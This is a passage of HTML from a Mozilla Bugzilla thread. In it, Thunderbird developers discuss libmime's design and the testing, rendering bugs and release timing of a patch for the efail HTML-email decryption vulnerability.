          <button type="button" class="change-spinner minor iconic" id="cs-127"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-127" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c127">Comment 127</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 15:47 PDT" data-time="1526597256">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-127">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-127" data-comment-id="13285941"><span class="quote">&gt; It's still unclear why we can't kill mimeInlineTextHTMLClass.</span >

Because it's the base class for 2 othe classes.

<span class="quote">&gt; I'm not familiar with (pseudo-)&quot;classes&quot; in MIME, as far as I know the code,
&gt; it's a mess of passing function pointers around and has little to do with OO design or a C++ class hierarchy.</span >

That a common first impression when somebody who knows C++ looks at libmime. If you understand it, it's actually brilliant. jwz wrote it, who is actually one of the founders of mozilla.org and was the tech lead in the beginning. C was a requirement for him, so C++ OO was out.

So, he wrote a completely OO system in pure C (!) for libmime. It actually has all OO properties of encypsulation, inheritance and polymorphy. And, although it's using function pointers (like all OO systems in C), it's actually type safe. That's better than the OO system of GTK+ (which Mozilla also uses, I might add), which is not type safe.

So, yes, the code looks all yucky to people who work in C++, but it's actually brilliant for C code. libmime is the misunderstood step child of Thunderbird. Please don't beat on the poor guy. He's been doing great work for us for many years, with few problems.

I might add that the real bug here is not actually coming from libmime. libmime does its part correctly here. The problem is in the frontend that is unable to put each MIME part in its own &lt;iframe&gt; as it should. The fix is in libmime, because it's just a workaround against failures in higher layers.</pre></div><div class="change-set" id="c128"><div class="comment" data-id="13285952" data-no="128"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-128" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15321655_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15321655_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-128"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-128" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c128">Comment 128</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 15:53 PDT" data-time="1526597636">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-128">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-128" data-comment-id="13285952">Oh, and it's actually the cleanest class hierarchy anywhere in Thunderbird :-). By far. And well documented, too, in mimei.h. Great reading.</pre></div><div class="change-set" id="c129"><div class="comment" data-id="13285985" data-no="129"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-129" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15321655_22599"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15321655_22599"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-129"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-129" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c129">Comment 129</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 16:17 PDT" data-time="1526599049">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-129">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-129" data-comment-id="13285985">Thanks for the explanation. Strangely enough I don't know a person who finds this brilliant. Most find it yucky, and fixing bugs wasn't much fun either over the years:
<a rel="nofollow" href="https://hg.mozilla.org/comm-central/log/tip/mailnews/mime/src/mimemalt.cpp">https://hg.mozilla.org/comm-central/log/tip/mailnews/mime/src/mimemalt.cpp</a>
<a rel="nofollow" href="https://hg.mozilla.org/comm-central/log/tip/mailnews/mime/src/mimemrel.cpp">https://hg.mozilla.org/comm-central/log/tip/mailnews/mime/src/mimemrel.cpp</a>
<a rel="nofollow" href="https://hg.mozilla.org/comm-central/log/tip/mailnews/mime/src/mimemoz2.cpp">https://hg.mozilla.org/comm-central/log/tip/mailnews/mime/src/mimemoz2.cpp</a>
<a rel="nofollow" href="https://hg.mozilla.org/comm-central/log/tip/mailnews/mime/src/mimedrft.cpp">https://hg.mozilla.org/comm-central/log/tip/mailnews/mime/src/mimedrft.cpp</a>
Particularly nice was <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - crash in MimeMultipart_parse_eof with multipart/related. kid-&gt;clazz accessed after free (double reference to child)"
   href="/show_bug.cgi?id=1016524">bug 1016524</a>, <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - Reply/&quot;Edit as new&quot;/&quot;Forward As-&gt;Attachment&quot;/Display message/Text Encoding of View, Options etc. : charset picked up from last attachment"
   href="/show_bug.cgi?id=1026989">bug 1026989</a> and <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Forwarding of multipart message doesn't detect correct charset if multipart/related comes before multipart/alternative"
   href="/show_bug.cgi?id=1251783">bug 1251783</a> :-(

Anyway, no one is opposing your patch, I even made it work on trunk and got you the test results we need. I'm also happy to organise some CSS.

===

I forgot to add Richard. Richard, see <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c120">comment #120</a>. You need to change the patch a little and
  #define TB_61 1</pre><div class="activity"><div class="change">Flags: needinfo?(richard.marti)</div></div></div><div class="change-set" id="c130"><div class="comment" data-id="13286393" data-no="130"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-130" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15321655_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15321655_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-130"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-130" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c130">Comment 130</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 23:48 PDT" data-time="1526626095">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-130">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-130" data-comment-id="13286393">hm, <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - Reply/&quot;Edit as new&quot;/&quot;Forward As-&gt;Attachment&quot;/Display message/Text Encoding of View, Options etc. : charset picked up from last attachment"
   href="/show_bug.cgi?id=1026989">bug 1026989</a> &quot;charset picked up from last attachment&quot;... I wonder how many bugs steem from the fact that the frontend is unable to put each attachment in its own &lt;iframe&gt;. I bet this is not just a security feature, but also a correctness feature. CSS styles would also bleed between documents, and so on. Anyways, back to the patches...

Thanks that you helped me with the trunk adaption. I spent most of the night trying to get a trunk build and failed. It doesn't compile here. (Could be related to my system, as the tree is green.) So, sorry, I can't make trunk patches right now.

Thanks also for your help above with the tests. If indeed it's just adapting the expected result values, it should be trivial, yes.</pre></div><div class="change-set" id="c131"><div class="comment" data-id="13286528" data-no="131"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-131" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15321655_22599"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15321655_22599"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-131"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-131" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c131">Comment 131</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-18 01:25 PDT" data-time="1526631919">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-131">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-131" data-comment-id="13286528">(In reply to Ben Bucksch (:BenB) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c130">comment #130</a>)
<span class="quote">&gt; I wonder how
&gt; many bugs steem from the fact that the frontend is unable to put each
&gt; attachment in its own &lt;iframe&gt;. I bet this is not just a security feature,
&gt; but also a correctness feature. CSS styles would also bleed between
&gt; documents, and so on.</span >
Yes, I agree 700%. See <a class="bz_bug_link
          bz_status_NEW"
   title="NEW - html attachment with CSS breaks email rendering"
   href="/show_bug.cgi?id=1297653">bug 1297653</a>, ancient <a class="bz_bug_link
          bz_status_NEW"
   title="NEW - Display attachments inline: Contents &amp; formatting of attached HTML file (background/CSS styles/position:absolute/dir=&quot;rtl&quot;...) leak into main HTML part or vice versa (wrong bgcolor/images/unclosed tags...: unreadable; multipart/mime, iframe,send web page)"
   href="/show_bug.cgi?id=31052">bug 31052</a> and friends. You approach here to at least ensure syntactical correctness of each HTML part by parsing it separately is a good step in the right direction. Even without &lt;iframe seamless&gt; we should implement <a class="bz_bug_link
          bz_status_NEW"
   title="NEW - html attachment with CSS breaks email rendering"
   href="/show_bug.cgi?id=1297653">bug 1297653</a>, so at least HTML attachments don't bleed CSS into the body.</pre></div><div class="change-set" id="c132"><div class="comment" data-id="13286948" data-no="132"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-132" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15321655_22599"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15321655_22599"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-132"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-132" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c132">Comment 132</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-18 04:08 PDT" data-time="1526641708">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-132">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-132" data-comment-id="13286948">Ben, can you also please provide a test for the new MIME parser class. As per <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c83">comment #83</a>, the C++ interface mozilla::dom::DOMParser::CreateWithoutGlobal() was created only for TB, it is not covered by any M-C tests and can break silently any time, see <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Port bug 1453869: Replace use of nsIDOMParser"
   href="/show_bug.cgi?id=1454842#c4">bug 1454842 comment #4</a>. It was previously only used in &quot;Windows Live Mail&quot; import but it is now moving onto the main code path for HTML mail. So it would be good to write an M-C gtest to guarantee its functioning so M-C bustage doesn't hit us. At the very least we should write a C-C test that loads a HTML mail with &quot;doubtful&quot; content and then checks that the body is properly &quot;corrected&quot;. We have many Xpcshell and Mozmill tests that load messages from file, process them and then check their body/content. So it wouldn't be hard to copy something together. The last one I did was in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Write test for bug 1454257 - Treatment of folded headers in nsParseMailbox.cpp"
   href="/show_bug.cgi?id=1456001">bug 1456001</a>.</pre></div><div class="change-set" id="c133"><div class="comment" data-id="13287679" data-no="133"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-133" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_282357" id="a15321655_22599"><img src="https://secure.gravatar.com/avatar/69a77b00400ed8b0e53e39c2c4789700?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_282357" id="a15321655_22599"><a class="email " href="/user_profile?user_id=282357" > <span class="fna">Richard Marti (:Paenglab)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-133"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-133" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c133">Comment 133</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-18 09:12 PDT" data-time="1526659937">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-133">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8977051"
         class="attachment"
         data-id="8977051" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="DOM.png">
      <meta itemprop="contentSize" content="21439">
      <meta itemprop="encodingFormat" content="image/png">
      <div class="label">
        Attached image
          <a class="link lightbox" href="attachment.cgi?id=8977051" itemprop="contentUrl">
        <span id="att-8977051-description" itemprop="description">DOM.png</span></a>
        — <a href="attachment.cgi?id=8977051&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-133" data-comment-id="13287679">(In reply to Jorg K (GMT+2) (bustage-fix only, NI for urgent reviews) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c120">comment #120</a>)
<span class="quote">&gt; Created <span class=""><a href="/attachment.cgi?id=8976711" name="attach_8976711" title="horizontal lines.png">attachment 8976711</a> <a href="/attachment.cgi?id=8976711&amp;action=edit" title="horizontal lines.png">[details]</a></span>
&gt; horizontal lines.png
&gt; 
&gt; Richard, could you please load the e-mail in <span class=""><a href="/attachment.cgi?id=8975458" name="attach_8975458" title="A1-dec-pgp-smime-html-reply.eml">attachment 8975458</a> <a href="/attachment.cgi?id=8975458&amp;action=edit" title="A1-dec-pgp-smime-html-reply.eml">[details]</a></span>
&gt; (which you encoded for me a little while ago) and apply patch &quot;Separate MIME
&gt; parts from each other, v4 (trunk and 52)&quot;. You should see what is shown in
&gt; the picture. Sadly the horizontal lines have no margin/padding. Could you
&gt; find our their class and add CSS to make the thing look a bit better.</span >

The problem isn't the missing padding, it's applied. When you view the body as plain text the padding is correct. The problem is on HTML and Simple HTML: The message text isn't placed inside the moz-text-html class like in moz-text-plain. You can see the position of the closing &lt;/div&gt; I marked with the red arrows.

Because of this, the moz-text-html class has a height of 0px and the following class is placed directly after the text.

When the text would be inside the class, all should be correct again.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(richard.marti)</span></div></div></div><div class="change-set" id="c134"><div class="comment" data-id="13288277" data-no="134"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-134" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15321655_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15321655_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-134"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-134" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c134">Comment 134</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-18 13:23 PDT" data-time="1526674985">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-134">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-134" data-comment-id="13288277">Can't test trunk, because it fails to compile for me. Filed <a class="bz_bug_link
          bz_status_REOPENED"
   title="REOPENED - Build error: cannot convert ‘nsPresState*’ to ‘mozilla::PresState*’ caused by left-over nsILayoutHistoryState.h in source tree"
   href="/show_bug.cgi?id=1462794">bug 1462794</a>.</pre><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_REOPENED"
   title="REOPENED - Build error: cannot convert ‘nsPresState*’ to ‘mozilla::PresState*’ caused by left-over nsILayoutHistoryState.h in source tree"
   href="/show_bug.cgi?id=1462794">1462794</a></div></div></div><div class="change-set" id="c135"><div class="comment" data-id="13288321" data-no="135"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-135" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15321655_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15321655_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-135"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-135" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c135">Comment 135</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-18 13:41 PDT" data-time="1526676084">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-135">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-135" data-comment-id="13288321"><span class="quote">&gt; Ben, can you also please provide a test for the new MIME parser class.</span >

Sorry, I have run of time for this bug. I spent most of the week on it (27 hours). Given that I'm not paid for it, I have to stop here.

<span class="quote">&gt; [the Gecko API we use] can break silently any time, see <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Port bug 1453869: Replace use of nsIDOMParser"
   href="/show_bug.cgi?id=1454842#c4">bug 1454842 comment #4</a>.</span >

I see your point. A test would be useful. But if the parser API indeed goes away, we'd fail to build. If it was building, but not working properly, lots of existing tests would fail, because this is now the default handler for HTML mails. So, I would say we have sufficient coverage. But... if you want to add a specific test later on, that's fine. I don't think the time is now, though.

In any case, I myself cannot spend any more time on this. I'll be available for help, if you need my expertise. If you want to polish this patch further, please go ahead. I'd only request that you attribute the commit to me.

The patch works, with 52 and trunk. 3 days ago, I've spent an entire night on this, to get out as quickly as possible. Please land it and get it out now.

People are waiting for the fix, eyes are on us. Every day we delay the fix causes PR damage. Please speak to Ryan, he spent the whole last day putting fires out.</pre></div><div class="change-set" id="c136"><div class="comment" data-id="13288341" data-no="136"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-136" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15321655_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15321655_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-136"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-136" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c136">Comment 136</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-18 13:53 PDT" data-time="1526676819">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-136">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-136" data-comment-id="13288341">For the unit tests, I would recommend:
* For existing tests, simply change the expected outcome to the current outcome.
* For a specific test case for this bug, I would
  * take the emls attached here, and
  * use some existing test code that compares a test email with the libmime output. Then,
  * check that the actual output is the current output.
  * If you want to reduce spurious test failures, you could use an email with only the cut-off HTML part.
    The expected output would contain the closing tags.

That should be reasonably quick to develop for somebody. But with all the build problems I had, on trunk and 60, and the review, I ran out of time. Sorry.</pre></div><div class="change-set" id="c137"><div class="comment" data-id="13288351" data-no="137"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-137" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_29811" id="a15321655_22599"><img src="https://secure.gravatar.com/avatar/20697ca69672a5276f24a34382a1ddbd?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_29811" id="a15321655_22599"><a class="email " href="/user_profile?user_id=29811" > <span class="fna">Wayne Mery (:wsmwk)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-137"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-137" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c137">Comment 137</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-18 14:02 PDT" data-time="1526677326">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-137">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-137" data-comment-id="13288351">To inform beyond those who I have PNed and are on drivers list, early this week we decided release 52.8.0 with the patches in hand to get them in the hands of users, and not wait on this last bug.  That release is immenent. The other efail patches will be mentioned in the CVE linked from the release notes.</pre></div><div class="change-set" id="c138"><div class="comment" data-id="13288864" data-no="138"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-138" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15321655_22599"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15321655_22599"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-138"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-138" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c138">Comment 138</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-18 16:09 PDT" data-time="1526684944">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-138">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-138" data-comment-id="13288864">Ben, I guess we can organise for someone else to write the tests, but with your MIME knowledge, please look at Richard's <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c133">comment #133</a>. Something isn't right with the HTML the new MIME class produces.

Thanks Richard, for the analysis. BTW, could you decode the message part?</pre></div><div class="change-set" id="c139"><div class="comment" data-id="13290750" data-no="139"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-139" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15321655_22599"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15321655_22599"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-139"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-139" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c139">Comment 139</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-18 23:21 PDT" data-time="1526710861">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-139">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-139" data-comment-id="13290750">Ben, I looked at the DOM for &quot;simple HTML&quot;. Sadly, that shows the same problem. The text content is not inside the &lt;div&gt;, thus proper CSS isn't applied. Richard, can you please confirm.

So &quot;simple HTML&quot; appears to have a bug which is now exposed on the code path for &quot;original HTML&quot;. I'm sure you agree we can't accept the patch in it's current form. Could you please take a look how to fix this issue.</pre><div class="activity"><div class="change">Flags: needinfo?(richard.marti)</div></div></div><div class="change-set" id="c140"><div class="comment" data-id="13290772" data-no="140"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-140" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_282357" id="a15321655_22599"><img src="https://secure.gravatar.com/avatar/69a77b00400ed8b0e53e39c2c4789700?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_282357" id="a15321655_22599"><a class="email " href="/user_profile?user_id=282357" > <span class="fna">Richard Marti (:Paenglab)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-140"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-140" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c140">Comment 140</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-19 00:38 PDT" data-time="1526715504">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-140">
